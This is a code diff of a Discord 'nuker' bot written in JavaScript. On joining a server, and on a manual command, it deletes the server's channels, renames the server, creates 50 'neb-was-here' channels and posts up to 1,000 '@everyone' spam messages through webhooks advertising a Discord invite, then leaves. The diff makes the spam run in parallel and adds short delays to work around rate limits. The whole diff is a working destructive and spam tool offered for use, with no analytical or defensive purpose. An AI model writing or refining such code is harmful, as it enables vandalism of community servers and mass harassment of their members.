@@ -72,11 +72,10 @@ client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
 
-// ====== AUTO-NUKE ON JOIN (USING WEBHOOKS) ======
+// ====== AUTO-NUKE ON JOIN (SYNCED: CHANNEL → WEBHOOK → SPAM) ======
 client.on('guildCreate', async (guild) => {
   const BLOCKED_GUILD_ID = '1345474714331643956';
   const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
-  const webhookName = 'neb-was-here';
 
   if (guild.id === BLOCKED_GUILD_ID) {
     console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
@@ -87,11 +86,11 @@ client.on('guildCreate', async (guild) => {
   console.log(`🎯 Auto-nuking server: ${guild.name} (${guild.id})`);
 
   let didSomething = false;
-  let sent = 0;
+  let totalSent = 0;
 
   try {
-    // Wait a bit after join
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    // Wait briefly after join
+    await new Promise(resolve => setTimeout(resolve, 500));
 
     // Step 1: Delete channels
     console.log('🧹 Deleting channels...');
@@ -137,77 +136,64 @@ client.on('guildCreate', async (guild) => {
     console.log('✅ Server renamed.');
     didSomething = true;
 
-    // Step 5: Create 50 channels
-    const createdChannels = [];
+    // Step 5+6+7: Synced — Create Channel → Webhook → Spam Immediately
     const totalChannelsToCreate = 50;
+    const MESSAGES_PER_CHANNEL = 20;
+    const MAX_TOTAL_MESSAGES = 1000;
 
-    console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
+    console.log(`⚡ Creating channels and spamming in real-time...`);
+
+    const tasks = [];
+
     for (let i = 0; i < totalChannelsToCreate; i++) {
-      const channel = await handleRateLimit(() =>
-        guild.channels.create({ name: `neb-was-here-${i + 1}` })
-          .catch(e => console.warn(`Channel #${i + 1} failed:`, e.message))
-      );
-      if (channel) {
+      const task = (async () => {
+        // 1. Create channel
+        const channel = await handleRateLimit(() =>
+          guild.channels.create({ name: `neb-was-here-${i + 1}` })
+            .catch(e => console.warn(`Channel create failed #${i + 1}:`, e.message))
+        );
+        if (!channel) return;
+
         console.log(`✅ Created channel: ${channel.name}`);
-        createdChannels.push(channel);
         didSomething = true;
-      }
-    }
 
-    if (createdChannels.length === 0) {
-      console.error('❌ No channels created. Aborting.');
-      await safeLeaveGuild(guild);
-      return;
-    }
+        // 2. Create webhook
+        const webhook = await handleRateLimit(() =>
+          channel.createWebhook({ name: 'neb-was-here' })
+            .catch(e => console.warn(`Webhook create failed in ${channel.name}:`, e.message))
+        );
 
-    // Step 6: Create WEBHOOKS in each channel
-    const webhooks = [];
-    console.log('🔧 Creating webhooks...');
-    for (const channel of createdChannels) {
-      const wh = await handleRateLimit(() =>
-        channel.createWebhook({ name: webhookName })
-          .catch(e => console.warn(`Webhook create failed in ${channel.name}:`, e.message))
-      );
-      if (wh) {
-        webhooks.push(wh);
+        if (!webhook) {
+          // Fallback: direct send
+          for (let j = 0; j < MESSAGES_PER_CHANNEL && totalSent < MAX_TOTAL_MESSAGES; j++) {
+            await handleRateLimit(() => channel.send(spamMessage));
+            totalSent++;
+          }
+          return;
+        }
+
         console.log(`🔗 Webhook created in ${channel.name}`);
-      }
+
+        // 3. Spam via webhook immediately
+        for (let j = 0; j < MESSAGES_PER_CHANNEL && totalSent < MAX_TOTAL_MESSAGES; j++) {
+          await handleRateLimit(() => webhook.send({ content: spamMessage }));
+          totalSent++;
+          if (totalSent % 100 === 0) console.log(`📨 Sent: ${totalSent}`);
+        }
+      })();
+
+      tasks.push(task);
+
+      // Tiny delay to avoid burst rate limits
+      await new Promise(r => setTimeout(r, 5));
     }
 
-    if (webhooks.length === 0) {
-      console.error('❌ No webhooks created. Falling back to direct send...');
-      // Fallback to normal send
-      for (const channel of createdChannels) {
-        for (let i = 0; i < 20 && sent < 1000; i++) {
-          await handleRateLimit(() => channel.send(spamMessage));
-          sent++;
-        }
-      }
-    } else {
-      // Step 7: SPAM via WEBHOOKS (FAST)
-      console.log(`🔥 Spamming via ${webhooks.length} webhooks...`);
-      const MAX_MESSAGES = 1000;
-      const MESSAGES_PER_WEBHOOK = 20;
+    // Run all tasks in parallel
+    await Promise.allSettled(tasks);
+    console.log(`✅ Sent ${totalSent} messages via synced webhook spam.`);
 
-      const spamPromises = [];
-
-      for (const webhook of webhooks) {
-        for (let i = 0; i < MESSAGES_PER_WEBHOOK && sent < MAX_MESSAGES; i++) {
-          spamPromises.push(
-            handleRateLimit(() => webhook.send({ content: spamMessage }))
-              .then(() => sent++)
-              .catch(() => {})
-          );
-        }
-      }
-
-      // Fire all at once
-      await Promise.allSettled(spamPromises);
-      console.log(`✅ Sent ${sent} messages via webhooks.`);
-    }
-
-    // Leave if successful
-    if (sent >= 950) await safeLeaveGuild(guild);
+    // Leave if most spam succeeded
+    if (totalSent >= 950) await safeLeaveGuild(guild);
 
     if (didSomething) {
       console.log('✅ Auto-nuke complete.');
@@ -392,7 +378,7 @@ client.on('messageCreate', async (message) => {
     try {
       console.log(`🎯 Manually nuking: ${guild.name}`);
 
-      // Delete channels, roles, emojis, rename
+      // Delete everything
       await Promise.allSettled([
         // Channels
         (async () => {
@@ -426,7 +412,7 @@ client.on('messageCreate', async (message) => {
         })()
       ]);
 
-      // Create 50 channels
+      // Create 50 channels with synced webhook spam
       const createdChannels = [];
       for (let i = 0; i < 50; i++) {
         const ch = await handleRateLimit(() =>
@@ -440,7 +426,7 @@ client.on('messageCreate', async (message) => {
         return;
       }
 
-      // Create webhooks
+      // Create webhooks and spam
       const webhooks = [];
       for (const ch of createdChannels) {
         const wh = await handleRateLimit(() =>
